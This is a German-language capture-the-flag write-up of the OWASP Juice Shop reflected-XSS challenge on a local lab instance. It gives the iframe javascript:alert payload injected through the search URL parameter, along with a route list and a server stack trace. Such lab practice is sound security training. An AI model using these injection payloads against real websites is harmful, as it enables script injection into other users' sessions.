# Reflected XSS

**XSS**

> *Perform a reflected XSS attack with < iframe src="javascript:alert(`xss`)" >.*

---

## Schwierigkeit

⭐⭐☆☆☆☆ 2-Sterne-Challenge (leicht)

---

## Beschreibung

XSS-Payload aus der Challenge direkt einfügen: `<iframe src="javascript:alert('xss')">` oder die URL manipulieren: `http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert(`xss`)">`

FAILD
![xss_faild](/img/xss_faild.png)

---

## Hint
 - Contact Us
 - package.json.bak (in der `Confidential Document` Challenge gefunden)

```
OWASP Juice Shop (Express ^4.21.0)
403 Error: Only .md and .pdf files are allowed!
   at verify (/home/gest/juice-shop/build/routes/fileServer.js:59:18)
   at /home/gest/juice-shop/build/routes/fileServer.js:43:13
   at Layer.handle [as handle_request] (/home/gest/juice-shop/node_modules/express/lib/router/layer.js:95:5)
   at trim_prefix (/home/gest/juice-shop/node_modules/express/lib/router/index.js:328:13)
   at /home/gest/juice-shop/node_modules/express/lib/router/index.js:286:9
   at param (/home/gest/juice-shop/node_modules/express/lib/router/index.js:365:14)
   at param (/home/gest/juice-shop/node_modules/express/lib/router/index.js:376:14)
   at Function.process_params (/home/gest/juice-shop/node_modules/express/lib/router/index.js:421:3)
   at next (/home/gest/juice-shop/node_modules/express/lib/router/index.js:280:10)
   at /home/gest/juice-shop/node_modules/serve-index/index.js:145:39
   at FSReqCallback.oncomplete (node:fs:198:5)
```

---

## Vorgehen

1. Laborumgebung gestartet und Zugriff auf die Juice Shop-Anwendung über den Browser:  
   [http://127.0.0.1:3000](http://127.0.0.1:3000)

2. Auf der nach Eingabefelder suchen oder URL-parameter angaben:
   - Suchleiste oben rechts
   - Feedback-Formular
   - Kontaktformular
   - Query-Parameter (z. B. /#/search?q=...)

4. Man muss einen Account haben und eingelogt sein um alle Seiten und Ihre Felder zu finden. Dafür auch den Bestellprozess einmal durchgehen.
   ```text
   /#/login                                   // Einloggen
   /#/search                                  // Produkt auswählen
   /#/basket                                  // Warenkorb
   /#/address/select                          // Checkout
   /#/address/create                          // Adresse angeben
   /#/address/select                          // Adresse auswählen
   /#/delivery-method                         // Lieferoptionen
   /#/payment/shop                            // Bezahlung auswählen
   /#/order-summary                           // Kassenübersicht
   /#/order-completion/2a35-78a41ac8367407e9  // Bestellbestätigung
   /#/order-history                           // Bestellungen verlauf
   /#/track-result?id=2a35-78a41ac8367407e9   // Bestellung verfolgen
   ```

5. Payload in der URL an stelle der Bestell-ID eingeben 
   ```
   http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
   ```

6. Challenge wird automatisch gelöst, sobald der XSS-Code ausgeführt wird (also ein alert("xss") sichtbar erscheint).

---

## Beweis

```text
URL: http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
Payload executed: ✅
Browser alert: "xss"
```

![xss_success](/img/xss_success.png)

:::
You successfully solved a challenge: Reflected XSS (Perform a reflected XSS attack with 
< iframe src="javascript:alert(`xss`)">.)
:::
